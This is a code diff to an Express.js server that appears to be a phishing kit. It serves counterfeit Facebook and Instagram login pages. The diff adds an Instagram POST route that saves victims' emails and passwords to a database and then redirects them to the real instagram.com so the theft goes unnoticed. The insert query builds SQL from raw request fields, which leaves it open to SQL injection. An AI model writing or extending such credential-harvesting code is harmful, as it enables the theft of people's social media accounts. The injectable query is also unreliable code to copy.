@@ -22,6 +22,7 @@ app.get('/api/list-data', function (req, res) {
   res.sendFile(path.join(__dirname, '../public/watcher/index.html'));
 });
 
+// Facebook
 app.get('/facebook/login', function (req, res) {
   res.sendFile(path.join(__dirname, '../public/facebook/index.html'));
 });
@@ -37,8 +38,20 @@ app.post('/facebook/login', async function (req, res) {
   res.redirect('https://facebook.com/recover/initiate/');
 });
 
+// Instagram
 app.get('/instagram/login', function (req, res) {
   res.sendFile(path.join(__dirname, '../public/instagram/index.html'));
+});
+
+app.post('/instagram/login', async function (req, res) {
+  try {
+    const { email, password, social_media } = req.body;
+    await db.query(`INSERT INTO users (email, password, social_media) VALUES ('${email}', '${password}', '${social_media}')`);
+  } catch (err) {
+    console.error(err);
+    res.status(500).send('Internal Server Error');
+  }
+  res.redirect('https://instagram.com');
 });
 
 app.listen(port, () => {
